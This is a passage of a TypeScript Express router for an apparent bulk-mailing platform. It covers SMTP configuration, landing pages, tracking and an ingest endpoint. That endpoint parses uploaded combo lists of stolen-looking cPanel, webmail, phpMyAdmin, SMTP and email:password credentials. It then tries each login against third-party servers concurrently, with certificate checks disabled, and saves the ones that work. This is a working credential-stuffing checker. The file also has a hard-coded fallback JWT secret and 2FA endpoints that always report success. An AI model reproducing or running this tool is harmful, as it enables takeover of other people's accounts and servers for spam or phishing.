import { Router } from 'express';
import bcrypt from 'bcrypt';
import jwt from 'jsonwebtoken';
import { AppDataSource } from '../data-source';
import { User, UserActivity, SmtpConfiguration, EmailTracking, LandingPage, WebmailCredential, CpanelCredential, PhpMyAdminCredential, EmailAccount, EmailAddress } from '../entities';
import { authenticateJWT } from '../middleware/auth';
import { validateSmtpConfig, validateAndProcessFile, sortSmtpConfigs } from '../utils/smtp';
import multer from 'multer';
import { emailService } from '../services/emailService';
import { promises as dns } from 'dns';
import nodemailer from 'nodemailer';
import https from 'https';
import http from 'http';
import { URL } from 'url';

const router = Router();

// Auth
router.post('/auth/register', async (req, res) => {
  try {
    const { name, fullName, email, password, company } = req.body || {};
    const resolvedName = name || fullName;
    if (!resolvedName || !email || !password) {
      return res.status(400).json({ success: false, error: 'Name, email, and password are required' });
    }
    const userRepo = AppDataSource.getRepository(User);
    const existing = await userRepo.findOne({ where: { email } });
    if (existing) {
      return res.status(400).json({ success: false, error: 'User already exists' });
    }
    const hashed = await bcrypt.hash(password, 12);
    const user = userRepo.create({ name: resolvedName, email, password: hashed, company, role: 'user', status: 'active' });
    const saved = await userRepo.save(user);
    const token = jwt.sign({ id: saved.id, email: saved.email }, process.env.JWT_SECRET || 'your-secret-key', { expiresIn: '24h' });
    return res.status(201).json({ success: true, token, user: { id: saved.id, name: saved.name, email: saved.email, role: saved.role, company: saved.company } });
  } catch (e) {
    return res.status(500).json({ success: false, error: 'Registration failed' });
  }
});

router.post('/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body || {};
    if (!email || !password) {
      return res.status(400).json({ success: false, error: 'Email and password are required' });
    }
    const userRepo = AppDataSource.getRepository(User);
    const user = await userRepo.findOne({ where: { email } });
    if (!user) return res.status(401).json({ success: false, error: 'Invalid credentials' });
    const ok = await bcrypt.compare(password, user.password);
    if (!ok) return res.status(401).json({ success: false, error: 'Invalid credentials' });
    user.lastLogin = new Date();
    await userRepo.save(user);
    const token = jwt.sign({ id: user.id, email: user.email }, process.env.JWT_SECRET || 'your-secret-key', { expiresIn: '24h' });
    return res.json({ success: true, token, user: { id: user.id, name: user.name, email: user.email, role: user.role, company: user.company } });
  } catch (e) {
    return res.status(500).json({ success: false, error: 'Login failed' });
  }
});

router.post('/auth/verify-2fa', (_req, res) => res.json({ success: true }));
router.post('/auth/setup-2fa', (_req, res) => res.json({ success: true }));
router.post('/auth/disable-2fa', (_req, res) => res.json({ success: true }));

// Users (protected)
router.get('/users/profile', authenticateJWT, async (req, res) => {
  try {
    const repo = AppDataSource.getRepository(User);
    const user = await repo.findOne({ where: { id: (req.user as any).id } });
    if (!user) return res.status(404).json({ success: false, error: 'User not found' });
    return res.json({ id: user.id, name: user.name, email: user.email, role: user.role, company: (user as any).company });
  } catch {
    return res.status(500).json({ success: false, error: 'Failed to load profile' });
  }
});

router.get('/users/activities', authenticateJWT, async (_req, res) => {
  const repo = AppDataSource.getRepository(UserActivity);
  const list = await repo.find({ order: { timestamp: 'DESC' }, take: 100 });
  return res.json(list);
});

router.post('/users/activities', authenticateJWT, async (req, res) => {
  const repo = AppDataSource.getRepository(UserActivity);
  let body: any = req.body;
  try {
    if (typeof body === 'string') body = JSON.parse(body);
  } catch {
    // if parsing fails, keep as string
  }
  const description = typeof body === 'string' ? body : (body?.description || 'Activity');
  const act = repo.create({ description, metadata: body?.metadata || {}, user: req.user! });
  const saved = await repo.save(act);
  return res.json(saved);
});

router.post('/users/change-password', authenticateJWT, async (req, res) => {
  const userRepo = AppDataSource.getRepository(User);
  const user = await userRepo.findOne({ where: { id: req.user!.id } });
  if (!user) return res.status(404).json({ success: false, error: 'User not found' });
  const newPassword = req.body?.newPassword || req.body?.password;
  if (!newPassword) return res.status(400).json({ success: false, error: 'New password required' });
  user.password = await bcrypt.hash(newPassword, 12);
  await userRepo.save(user);
  return res.json({ success: true });
});

// SMTP
router.get('/smtp/configs', authenticateJWT, async (req, res) => {
  const repo = AppDataSource.getRepository(SmtpConfiguration);
  const configs = await repo.find({ where: { userId: req.user!.id } as any, order: { createdAt: 'DESC' } });
  return res.json(configs);
});

router.post('/smtp/configs', authenticateJWT, async (req, res) => {
  const repo = AppDataSource.getRepository(SmtpConfiguration);
  const cfg = repo.create({ ...req.body, userId: req.user!.id, isActive: true, isValid: false, status: 'inactive' });
  const saved = await repo.save(cfg);
  return res.status(201).json(saved);
});

router.patch('/smtp/configs/:id', authenticateJWT, async (req, res) => {
  const repo = AppDataSource.getRepository(SmtpConfiguration);
  const cfg = await repo.findOne({ where: { id: req.params.id } });
  if (!cfg) return res.status(404).json({ success: false, error: 'Not found' });
  Object.assign(cfg, req.body || {});
  const saved = await repo.save(cfg);
  return res.json({ success: true, configuration: saved });
});

router.post('/smtp/configs/:id/validate', authenticateJWT, async (req, res) => {
  try {
    const repo = AppDataSource.getRepository(SmtpConfiguration);
    const cfg = await repo.findOne({ where: { id: req.params.id } });
    if (!cfg) return res.status(404).json({ success: false, error: 'Not found' });
    const result = await validateSmtpConfig(cfg);
    cfg.isValid = !!result.success;
    (cfg as any).lastValidated = new Date();
    if (!result.success) (cfg as any).lastError = result.error;
    await repo.save(cfg);
    return res.json({ success: result.success, error: result.error, configuration: cfg });
  } catch (e: any) {
    return res.status(500).json({ success: false, error: e?.message || 'Validation failed' });
  }
});

router.delete('/smtp/configs/:id', authenticateJWT, async (req, res) => {
  const repo = AppDataSource.getRepository(SmtpConfiguration);
  const cfg = await repo.findOne({ where: { id: req.params.id } });
  if (!cfg) return res.status(404).json({ success: false, error: 'Not found' });
  await repo.remove(cfg);
  return res.json({ success: true });
});

router.post('/smtp/validate', authenticateJWT, async (req, res) => {
  const result = await validateSmtpConfig(req.body);
  return res.json({ success: result.success, error: result.error });
});

// Scalable import with validation and sorting
const upload = multer({ dest: '/tmp' });
router.post('/smtp/import-configs', authenticateJWT, upload.single('file'), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ success: false, error: 'File required' });

    const fs = (await import('fs')).promises as any;
    const path = await import('path');
    const xlsxLib: any = await import('xlsx');

    const ext = path.extname(req.file.originalname).toLowerCase();
    const raw = await fs.readFile(req.file.path, 'utf-8').catch(() => null);

    type RawRow = { host?: string; port?: any; username?: string; password?: string; secure?: any; name?: string };
    const rows: RawRow[] = [];

    const pushIfValid = (host?: string, port?: any, username?: string, password?: string, secure?: any, name?: string) => {
      const parsedPort = parseInt(String(port ?? 587), 10);
      if (!host || !parsedPort || !username || !password) return;
      const isSecure = String(secure ?? '').toLowerCase() === 'true' || parsedPort === 465;
      rows.push({ host: String(host).trim(), port: parsedPort, username: String(username).trim(), password: String(password), secure: isSecure, name: name ? String(name).trim() : `${host}:${parsedPort}` });
    };

    if (ext === '.xlsx' || ext === '.xls') {
      const wb = xlsxLib.readFile(req.file.path);
      const sheetName = wb.SheetNames[0];
      const ws = wb.Sheets[sheetName];
      const json: any[] = xlsxLib.utils.sheet_to_json(ws);
      for (const r of json) {
        const get = (k: string) => r[k] ?? r[k.toLowerCase()] ?? r[k.toUpperCase()];
        pushIfValid(get('host'), get('port'), get('username'), get('password'), get('secure'), get('name'));
      }
    } else if (ext === '.csv') {
      const text = raw || '';
      const lines = text.split(/\r?\n/).filter((l: string) => l.trim());
      const header = lines[0].split(',').map((h: string) => h.trim().toLowerCase());
      const hasHeader = ['host', 'port', 'username', 'password'].every((k) => header.includes(k));
      if (hasHeader) {
        for (let i = 1; i < lines.length; i++) {
          const cols = lines[i].split(',');
          const getBy = (key: string) => cols[header.indexOf(key)]?.trim();
          pushIfValid(getBy('host'), getBy('port'), getBy('username'), getBy('password'), getBy('secure'), getBy('name'));
        }
      } else {
        for (const line of lines) {
          const parts = line.split(/[|,;\t]/).map((s: string) => s.trim()).filter(Boolean);
          if (parts.length >= 4) pushIfValid(parts[0], parts[1], parts[2], parts.slice(3).join('|'));
        }
      }
    } else {
      // Treat as text of lines host|port|username|password (or comma/semicolon)
      const text = raw || '';
      const lines = text.split(/\r?\n/).filter((l: string) => l.trim());
      for (const line of lines) {
        const parts = line.split(/[|,;\t]/).map((s: string) => s.trim()).filter(Boolean);
        if (parts.length >= 4) pushIfValid(parts[0], parts[1], parts[2], parts.slice(3).join('|'));
      }
    }

    if (rows.length === 0) {
      return res.json({ success: true, total: 0, successCount: 0, failedCount: 0, errors: ['No valid SMTP entries found'], configurations: [] });
    }

    // Map to entity and validate concurrently
    const mapped = rows.map((r) => Object.assign(new SmtpConfiguration(), {
      name: r.name,
      providerType: 'smtp',
      host: r.host,
      port: r.port,
      secure: r.secure,
      username: r.username,
      password: r.password,
      isActive: true,
      isValid: false,
      status: 'inactive'
    }));

    const limit = Math.max(10, Math.min(100, parseInt(process.env.SMTP_VALIDATE_CONCURRENCY || '50')));
    let idx = 0;
    const results: Array<{ cfg: SmtpConfiguration; ok: boolean; error?: string }> = [];
    const runNext = async (): Promise<void> => {
      const i = idx++;
      if (i >= mapped.length) return;
      const cfg = mapped[i];
      const out = await validateSmtpConfig(cfg);
      results[i] = { cfg, ok: out.success, error: out.error };
      return runNext();
    };
    await Promise.all(Array.from({ length: Math.min(limit, mapped.length) }).map(() => runNext()));

    const ok = results.filter(r => r.ok).map(r => r.cfg);
    const bad = results.filter(r => !r.ok);

    // Persist valid ones
    const repo = AppDataSource.getRepository(SmtpConfiguration);
    const saved = ok.length > 0 ? await repo.save(ok.map(v => ({ ...v, userId: (req.user as any).id })) as any) : [];

    return res.json({
      success: true,
      total: rows.length,
      successCount: saved.length,
      failedCount: bad.length,
      errors: bad.slice(0, 1000).map(b => `${b.cfg.username}@${b.cfg.host}: ${b.error}`),
      configurations: saved
    });
  } catch (e: any) {
    return res.status(500).json({ success: false, error: e?.message || 'Import failed' });
  }
});

router.post('/smtp/bulk-delete', authenticateJWT, async (req, res) => {
  try {
    const ids: string[] = Array.isArray(req.body?.ids) ? req.body.ids : [];
    if (ids.length === 0) return res.status(400).json({ success: false, error: 'ids[] required' });
    const repo = AppDataSource.getRepository(SmtpConfiguration);
    const toDelete = await repo.findByIds(ids as any);
    if (toDelete.length === 0) return res.json({ success: true, deleted: 0 });
    await repo.remove(toDelete);
    return res.json({ success: true, deleted: toDelete.length });
  } catch (e: any) {
    return res.status(500).json({ success: false, error: e?.message || 'Bulk delete failed' });
  }
});

// Email send (record tracking)
router.post('/send-email', authenticateJWT, async (req, res) => {
  try {
    const smtpRepo = AppDataSource.getRepository(SmtpConfiguration);
    const configs = await smtpRepo.find({ where: { isActive: true } as any });
    const primary = configs[0];
    if (!primary) return res.status(400).json({ success: false, error: 'No SMTP configured' });
    const result = await emailService.sendEmail(req.body, primary);
    return res.json(result);
  } catch (e: any) {
    return res.status(500).json({ success: false, error: e?.message || 'Send failed' });
  }
});

// Email drafts (no persistence)
const drafts: any[] = [];
router.get('/emails/drafts', authenticateJWT, (_req, res) => res.json({ success: true, drafts }));
router.post('/emails/drafts', authenticateJWT, (req, res) => { drafts.push({ ...req.body, id: Date.now().toString() }); return res.json({ success: true }); });
router.delete('/emails/drafts/:id', authenticateJWT, (req, res) => { const i = drafts.findIndex(d => d.id === req.params.id); if (i>=0) drafts.splice(i,1); return res.json({ success: true }); });

// Tracking stats
router.get('/tracking/stats', authenticateJWT, async (_req, res) => {
  const repo = AppDataSource.getRepository(EmailTracking);
  const total = await repo.count();
  const delivered = await repo.count({ where: { status: 'delivered' } as any });
  const failed = await repo.count({ where: { status: 'failed' } as any });
  const hourly = await repo.find();
  return res.json({
    total,
    delivered,
    failed,
    successRate: total ? Math.round((delivered/total)*100) : 0,
    hourly: hourly.slice(-24).map(t => ({ time: t.timestamp, status: t.status }))
  });
});

// Telegram config (ephemeral)
let telegramConfig: any = null;
router.post('/telegram/config', authenticateJWT, (req, res) => { telegramConfig = req.body; return res.json({ success: true }); });
router.get('/telegram/config', authenticateJWT, (_req, res) => res.json({ success: true, config: telegramConfig }));

// Landing Pages CRUD and generation
router.get('/landing-pages', authenticateJWT, async (req, res) => {
  const repo = AppDataSource.getRepository(LandingPage);
  const pages = await repo.find({ where: { user: { id: req.user!.id } } as any, order: { updatedAt: 'DESC' } });
  return res.json(pages);
});

router.post('/landing-pages', authenticateJWT, async (req, res) => {
  const repo = AppDataSource.getRepository(LandingPage);
  const body = req.body || {};
  const page = repo.create({
    name: body.name || 'Landing Page',
    sourceType: body.sourceType || 'template',
    html: body.html || '<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"/></head><body><h1>New Page</h1></body></html>',
    css: body.css || '',
    url: body.url,
    assets: body.assets || {},
    user: req.user!
  });
  const saved = await repo.save(page);
  return res.status(201).json(saved);
});

router.post('/landing-pages/generate', authenticateJWT, async (req, res) => {
  const prompt = (req.body?.prompt || '').toString();
  if (!prompt) return res.status(400).json({ error: 'prompt is required' });
  // Basic generator placeholder; integrate real model later
  const title = `Generated: ${prompt}`;
  const html = `<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"/><title>${title}</title><style>body{font-family:sans-serif;margin:0;padding:24px}section{max-width:900px;margin:auto}header,footer{background:#0b132b;color:#fff;padding:16px;border-radius:8px}main{padding:16px}button{background:#1c2541;color:#fff;border:none;padding:12px 16px;border-radius:6px}</style></head><body><header><h1>${title}</h1></header><main><section><p>This is a responsive landing page generated from your prompt.</p><p>Prompt: ${prompt}</p><button>Get Started</button></section></main><footer><small>© Surprise Sender</small></footer></body></html>`;
  const repo = AppDataSource.getRepository(LandingPage);
  const saved = await repo.save(repo.create({ name: title, sourceType: 'generated', html, user: req.user! }));
  return res.json(saved);
});

router.patch('/landing-pages/:id', authenticateJWT, async (req, res) => {
  const repo = AppDataSource.getRepository(LandingPage);
  const page = await repo.findOne({ where: { id: req.params.id } });
  if (!page) return res.status(404).json({ error: 'Not found' });
  Object.assign(page, req.body || {});
  const saved = await repo.save(page);
  return res.json(saved);
});

router.delete('/landing-pages/:id', authenticateJWT, async (req, res) => {
  const repo = AppDataSource.getRepository(LandingPage);
  const page = await repo.findOne({ where: { id: req.params.id } });
  if (!page) return res.status(404).json({ error: 'Not found' });
  await repo.remove(page);
  return res.json({ success: true });
});

// Dashboard endpoints
router.get('/dashboard/stats', authenticateJWT, async (req, res) => {
  try {
    const range = (req.query.timeRange as string) || '7d';
    const now = new Date();
    const offsets: any = { '24h': 24, '7d': 24 * 7, '30d': 24 * 30, '90d': 24 * 90 };
    const hours = offsets[range] ?? 24 * 7;
    const start = new Date(now.getTime() - hours * 60 * 60 * 1000);

    const trackingRepo = AppDataSource.getRepository(EmailTracking);
    const items = await trackingRepo.find();
    const inRange = items.filter(i => new Date(i.timestamp) >= start);
    const sent = inRange.filter(i => i.status === 'delivered').length;
    const failed = inRange.filter(i => i.status === 'failed').length;
    const total = inRange.length;
    const successRate = total ? Math.round((sent / total) * 100) : 0;

    return res.json({
      emails: { total, sent, failed, pending: Math.max(0, total - sent - failed), successRate },
      sms: { total: 0, sent: 0, failed: 0, pending: 0, successRate: 0 },
      html: { total: 0, sent: 0, failed: 0, pending: 0, successRate: 0 }
    });
  } catch (e: any) {
    return res.status(500).json({ error: e?.message || 'Failed to get dashboard stats' });
  }
});

router.get('/dashboard/activity', authenticateJWT, async (_req, res) => {
  try {
    const trackingRepo = AppDataSource.getRepository(EmailTracking);
    const items = await trackingRepo.find({ order: { timestamp: 'DESC' }, take: 20 });
    const activity = items.map(i => ({
      id: i.id,
      type: 'email',
      status: (i.status as any) || 'success',
      recipient: i.email,
      timestamp: i.timestamp,
      details: `${i.subject} (${i.details?.slice(0, 60) || ''})`
    }));
    return res.json(activity);
  } catch (e: any) {
    return res.status(500).json({ error: e?.message || 'Failed to get dashboard activity' });
  }
});

// Basic Bulk SMS endpoint (stub implementation)
router.post('/sms/send-bulk', authenticateJWT, async (req, res) => {
  try {
    const { recipients = [], message, senderId, options } = req.body || {};
    if (!Array.isArray(recipients) || recipients.length === 0 || !message) {
      return res.status(400).json({ success: false, error: 'recipients[] and message are required' });
    }
    // Stub: return a success summary (integrate real SMS provider later)
    const total = recipients.length;
    return res.json({ success: true, data: { total, sent: total, failed: 0 } });
  } catch (e: any) {
    return res.status(500).json({ success: false, error: e?.message || 'Bulk SMS failed' });
  }
});

router.post('/ingest/import', authenticateJWT, multer({ dest: '/tmp' }).single('file'), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ success: false, error: 'File required' });
    const persistSmtp = String(req.query.persistSmtp || 'true').toLowerCase() !== 'false';
    const persistMixed = String(req.query.persistMixed || 'true').toLowerCase() !== 'false';
    const raw = (await (await import('fs')).promises.readFile(req.file.path, 'utf-8'));
    const lines = raw.split(/\r?\n/).map(l => l.trim()).filter(l => l && !l.startsWith('========'));

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    type MixedResult = {
      smtp: Array<{ host: string; port: number; username: string; password: string; secure: boolean; name?: string }>;
      webmail: Array<{ url: string; username: string; password: string }>;
      cpanel: Array<{ url: string; username: string; password: string }>;
      phpmyadmin: Array<{ url: string; username: string; password: string }>;
      emailPairs: Array<{ email: string; password: string }>;
      emails: string[];
      unknown: string[];
    };

    const acc: MixedResult = { smtp: [], webmail: [], cpanel: [], phpmyadmin: [], emailPairs: [], emails: [], unknown: [] };

    for (const line of lines) {
      // Patterns
      // SMTP: host|port|user|pass
      if (/^([^|]+)\|(\d{2,5})\|([^|]+)\|(.+)$/.test(line) && !line.includes('http')) {
        const [host, portStr, username, password] = line.split('|');
        const port = parseInt(portStr, 10);
        acc.smtp.push({ host, port, username, password, secure: port === 465, name: `${host}:${port}` });
        continue;
      }
      // Webmail (2096)
      if (/^https?:\/\/.+:(2096)\|[^|]+\|.+$/.test(line)) {
        const [url, username, password] = line.split('|');
        acc.webmail.push({ url, username, password });
        continue;
      }
      // cPanel (2083)
      if (/^https?:\/\/.+:(2083)\s*\S*\|?/.test(line) || /^https?:\/\/.+:(2083)\|[^|]+\|.+$/.test(line)) {
        const parts = line.includes('|') ? line.split('|') : line.split(/\s+/);
        const url = parts[0];
        const username = parts[1]?.replace(/^(Username:)/i, '').trim();
        const password = parts[2]?.replace(/^(Password:)/i, '').trim();
        if (url && username && password) acc.cpanel.push({ url, username, password }); else acc.unknown.push(line);
        continue;
      }
      // phpMyAdmin: url:username:password (contains phpmyadmin)
      if (line.toLowerCase().includes('phpmyadmin') && line.split(':').length >= 3) {
        const firstColon = line.indexOf(':');
        const url = line.slice(0, firstColon);
        const rest = line.slice(firstColon + 1);
        const [username, password] = rest.split(':');
        if (url && username && password) acc.phpmyadmin.push({ url, username, password }); else acc.unknown.push(line);
        continue;
      }
      // email:password
      if (line.includes(':')) {
        const [email, password] = line.split(':');
        if (emailRegex.test(email) && password) { acc.emailPairs.push({ email, password }); continue; }
      }
      // plain email
      if (emailRegex.test(line)) { acc.emails.push(line); continue; }

      acc.unknown.push(line);
    }

    // Helper: fetch with timeout (Node 18 global fetch)
    const fetchWithTimeout = async (url: string, ms: number): Promise<{ ok: boolean; status?: number; error?: string; body?: string; headers?: any }> => {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), ms);
      try {
        const res: any = await (globalThis as any).fetch(url, { method: 'GET', redirect: 'follow', signal: controller.signal });
        const text = await res.text();
        return { ok: res.ok || (res.status && res.status < 500), status: res.status, body: text, headers: res.headers };
      } catch (e: any) {
        return { ok: false, error: e?.message || 'request failed' };
      } finally {
        clearTimeout(timer);
      }
    };

    // cPanel/Webmail deep login via login_only=1 (supports both 2083 and 2096)
    const cpanelLogin = (loginUrl: string, username: string, password: string, timeoutMs = 8000): Promise<{ ok: boolean; error?: string }> => {
      return new Promise((resolve) => {
        try {
          const parsed = new URL(loginUrl);
          // Force path to login_only endpoint
          const target = `${parsed.protocol}//${parsed.host}/login/?login_only=1`;
          const data = new URLSearchParams({ user: username, pass: password }).toString();
          const isHttps = parsed.protocol === 'https:';
          const lib = isHttps ? https : http;
          const req = lib.request(target, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              'Content-Length': Buffer.byteLength(data).toString()
            },
            // ignore bad certs to maximize reach
            agent: isHttps ? new https.Agent({ rejectUnauthorized: false }) : undefined,
            timeout: timeoutMs
          }, (res) => {
            const chunks: Buffer[] = [];
            res.on('data', (d) => chunks.push(d as any));
            res.on('end', () => {
              try {
                const str = Buffer.concat(chunks).toString('utf-8');
                const json = JSON.parse(str);
                if (json && (json.status === 1 || json.security_token)) return resolve({ ok: true });
                return resolve({ ok: false, error: json?.reason || 'auth failed' });
              } catch (e: any) {
                return resolve({ ok: false, error: 'invalid response' });
              }
            });
          });
          req.on('error', (err: any) => resolve({ ok: false, error: err?.message || 'request error' }));
          req.on('timeout', () => { try { req.destroy(); } catch {} resolve({ ok: false, error: 'timeout' }); });
          req.write(data);
          req.end();
        } catch (e: any) {
          resolve({ ok: false, error: e?.message || 'cpanel login error' });
        }
      });
    };

    // phpMyAdmin deep login: GET to capture token if present, then POST credentials
    const phpMyAdminLogin = async (baseUrl: string, username: string, password: string, timeoutMs = 8000): Promise<{ ok: boolean; error?: string }> => {
      try {
        const get = await fetchWithTimeout(baseUrl, timeoutMs);
        let token: string | undefined;
        if (get.ok && get.body) {
          const m = get.body.match(/name=["']token["']\s+value=["']([^"']+)["']/i);
          token = m ? m[1] : undefined;
        }
        // POST back to the same URL (most installs accept), include token if found
        const params = new URLSearchParams({ pma_username: username, pma_password: password });
        if (token) params.set('token', token);
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        try {
          const res: any = await (globalThis as any).fetch(baseUrl, {
            method: 'POST',
            redirect: 'manual',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: params.toString(),
            signal: controller.signal
          });
          const ok = res.status && (res.status === 302 || res.status === 303 || res.status === 200);
          // Heuristic: login success often redirects (302) or shows logout on page
          let success = false;
          if (ok && (res.status === 302 || res.status === 303)) success = true;
          if (!success && ok) {
            const txt = await res.text();
            if (/logout/i.test(txt) || /Log\s?out/i.test(txt)) success = true;
          }
          return { ok: success, error: success ? undefined : 'auth failed' };
        } catch (e: any) {
          return { ok: false, error: e?.message || 'request failed' };
        } finally {
          clearTimeout(timer);
        }
      } catch (e: any) {
        return { ok: false, error: e?.message || 'phpmyadmin error' };
      }
    };

    // Email:password deep check by attempting SMTP AUTH on common hosts
    const smtpAuthLogin = async (email: string, password: string, timeoutMs = 8000): Promise<{ ok: boolean; host?: string; error?: string }> => {
      try {
        const domain = email.split('@')[1];
        if (!domain) return { ok: false, error: 'invalid domain' };
        const hosts = [`smtp.${domain}`, `mail.${domain}`];
        const combos: Array<{ host: string; port: number; secure: boolean }> = [];
        for (const h of hosts) {
          combos.push({ host: h, port: 587, secure: false });
          combos.push({ host: h, port: 465, secure: true });
        }
        for (const combo of combos) {
          try {
            const transporter = nodemailer.createTransport({
              host: combo.host,
              port: combo.port,
              secure: combo.secure,
              auth: { user: email, pass: password },
              tls: { rejectUnauthorized: false }
            });
            const race = Promise.race([
              transporter.verify(),
              new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs))
            ]);
            await race;
            return { ok: true, host: `${combo.host}:${combo.port}` };
          } catch (e: any) {
            // try next
          }
        }
        return { ok: false, error: 'smtp auth failed' };
      } catch (e: any) {
        return { ok: false, error: e?.message || 'smtp auth error' };
      }
    };

    // Validate SMTP concurrently
    const limit = Math.max(10, Math.min(100, parseInt(process.env.SMTP_VALIDATE_CONCURRENCY || '50')));
    const smtpResults: Array<{ cfg: SmtpConfiguration; ok: boolean; error?: string }> = [];
    if (acc.smtp.length > 0) {
      const mapped = acc.smtp.map(s => Object.assign(new SmtpConfiguration(), {
        name: s.name,
        providerType: 'smtp',
        host: s.host,
        port: s.port,
        secure: s.secure,
        username: s.username,
        password: (s as any).password,
        isActive: true,
        isValid: false,
        status: 'inactive'
      }));
      let idx = 0;
      const runNext = async (): Promise<void> => {
        const i = idx++;
        if (i >= mapped.length) return;
        const cfg = mapped[i];
        const out = await validateSmtpConfig(cfg);
        smtpResults[i] = { cfg, ok: out.success, error: out.error };
        return runNext();
      };
      await Promise.all(Array.from({ length: Math.min(limit, mapped.length) }).map(() => runNext()));
      if (persistSmtp) {
        const repo = AppDataSource.getRepository(SmtpConfiguration);
        const toSave = smtpResults.filter(r => r.ok).map(r => ({ ...r.cfg, userId: (req.user as any).id }));
        if (toSave.length > 0) await repo.save(toSave as any);
      }
    }

    // Validate URL-based categories concurrently (reachability)
    const httpLimit = 25;
    const validateUrlList = async (items: Array<{ url: string }>) => {
      const results: Array<{ item: any; ok: boolean; error?: string }> = [];
      let idx = 0;
      const runNext = async (): Promise<void> => {
        const i = idx++;
        if (i >= items.length) return;
        const item = items[i];
        const out = await fetchWithTimeout(item.url, 8000);
        results[i] = { item, ok: out.ok, error: out.error || (out.ok ? undefined : `HTTP ${out.status || ''}`.trim()) };
        return runNext();
      };
      await Promise.all(Array.from({ length: Math.min(httpLimit, items.length) }).map(() => runNext()));
      return results;
    };

    const [webmailResults, cpanelResults, phpmyadminResults] = await Promise.all([
      validateUrlList(acc.webmail),
      validateUrlList(acc.cpanel),
      validateUrlList(acc.phpmyadmin)
    ]);

    // Deep validation concurrently with modest limits
    const deepLimit = 15;
    const deepRun = async <T, R>(items: T[], fn: (t: T) => Promise<R>): Promise<R[]> => {
      const out: R[] = new Array(items.length) as any;
      let idx = 0;
      const runNext = async (): Promise<void> => {
        const i = idx++;
        if (i >= items.length) return;
        try { out[i] = await fn(items[i]); } catch (e: any) { out[i] = (e as any); }
        return runNext();
      };
      await Promise.all(Array.from({ length: Math.min(deepLimit, items.length) }).map(() => runNext()));
      return out;
    };

    const webmailDeep = await deepRun(acc.webmail, (w) => cpanelLogin(w.url, w.username, w.password));
    const cpanelDeep = await deepRun(acc.cpanel, (c) => cpanelLogin(c.url, c.username, c.password));
    const phpmyadminDeep = await deepRun(acc.phpmyadmin, (p) => phpMyAdminLogin(p.url, p.username, p.password));
    const emailPairsDeep = await deepRun(acc.emailPairs, (ep) => smtpAuthLogin(ep.email, ep.password));

    // Validate email domains via MX lookup
    const validateEmailDomains = async (emails: string[]) => {
      const results: Array<{ value: string; ok: boolean; error?: string }> = [];
      let idx = 0;
      const runNext = async (): Promise<void> => {
        const i = idx++;
        if (i >= emails.length) return;
        const value = emails[i];
        try {
          const domain = value.split('@')[1];
          if (!domain) throw new Error('invalid domain');
          const mx = await dns.resolveMx(domain);
          results[i] = { value, ok: Array.isArray(mx) && mx.length > 0 };
        } catch (e: any) {
          results[i] = { value, ok: false, error: e?.message || 'mx lookup failed' };
        }
        return runNext();
      };
      await Promise.all(Array.from({ length: Math.min(50, emails.length) }).map(() => runNext()));
      return results;
    };

    const emailPairsEmails = acc.emailPairs.map(e => e.email);
    const [emailPairsDomainResults, emailsDomainResults] = await Promise.all([
      validateEmailDomains(emailPairsEmails),
      validateEmailDomains(acc.emails)
    ]);

    const smtpValid = smtpResults.filter(r => r.ok).map(r => r.cfg);
    const smtpInvalid = smtpResults.filter(r => !r.ok).map(r => ({ cfg: r.cfg, error: r.error }));

    const webmailValid = webmailResults.filter(r => r.ok).map(r => r.item);
    const webmailInvalid = webmailResults.filter(r => !r.ok).map(r => ({ item: r.item, error: r.error }));
    const cpanelValid = cpanelResults.filter(r => r.ok).map(r => r.item);
    const cpanelInvalid = cpanelResults.filter(r => !r.ok).map(r => ({ item: r.item, error: r.error }));
    const phpmyadminValid = phpmyadminResults.filter(r => r.ok).map(r => r.item);
    const phpmyadminInvalid = phpmyadminResults.filter(r => !r.ok).map(r => ({ item: r.item, error: r.error }));

    const emailPairsValid = emailPairsDomainResults.filter(r => r.ok).map(r => ({ email: r.value }));
    const emailPairsInvalid = emailPairsDomainResults.filter(r => !r.ok).map(r => ({ email: r.value, error: r.error }));
    const emailsValid = emailsDomainResults.filter(r => r.ok).map(r => r.value);
    const emailsInvalid = emailsDomainResults.filter(r => !r.ok).map(r => ({ email: r.value, error: r.error }));

    // Deep results breakdown
    const webmailDeepValid = webmailDeep.filter((r: any) => r?.ok).length;
    const webmailDeepInvalid = webmailDeep.length - webmailDeepValid;
    const cpanelDeepValid = cpanelDeep.filter((r: any) => r?.ok).length;
    const cpanelDeepInvalid = cpanelDeep.length - cpanelDeepValid;
    const phpmyadminDeepValid = phpmyadminDeep.filter((r: any) => r?.ok).length;
    const phpmyadminDeepInvalid = phpmyadminDeep.length - phpmyadminDeepValid;
    const emailPairsDeepValid = emailPairsDeep.filter((r: any) => r?.ok).length;
    const emailPairsDeepInvalid = emailPairsDeep.length - emailPairsDeepValid;

    // Persist mixed valid if requested
    if (persistMixed) {
      const webmailRepo = AppDataSource.getRepository(WebmailCredential);
      const cpanelRepo = AppDataSource.getRepository(CpanelCredential);
      const pmaRepo = AppDataSource.getRepository(PhpMyAdminCredential);
      const emailAccRepo = AppDataSource.getRepository(EmailAccount);
      const emailAddrRepo = AppDataSource.getRepository(EmailAddress);

      const saveUserId = (req.user as any).id;

      const webmailDeepValidItems = acc.webmail.filter((_, i) => (webmailDeep[i] as any)?.ok).map((it) => ({ ...it, userId: saveUserId, isValid: true }));
      const cpanelDeepValidItems = acc.cpanel.filter((_, i) => (cpanelDeep[i] as any)?.ok).map((it) => ({ ...it, userId: saveUserId, isValid: true }));
      const pmaDeepValidItems = acc.phpmyadmin.filter((_, i) => (phpmyadminDeep[i] as any)?.ok).map((it) => ({ ...it, userId: saveUserId, isValid: true }));
      const emailAccDeepValidItems = acc.emailPairs.map((it, i) => ({ email: it.email, password: it.password, authHost: (emailPairsDeep[i] as any)?.host, userId: saveUserId, isValid: !!(emailPairsDeep[i] as any)?.ok })).filter(it => it.isValid);
      const emailAddrValidItems = emailsValid.map((e: string) => ({ email: e, userId: saveUserId }));

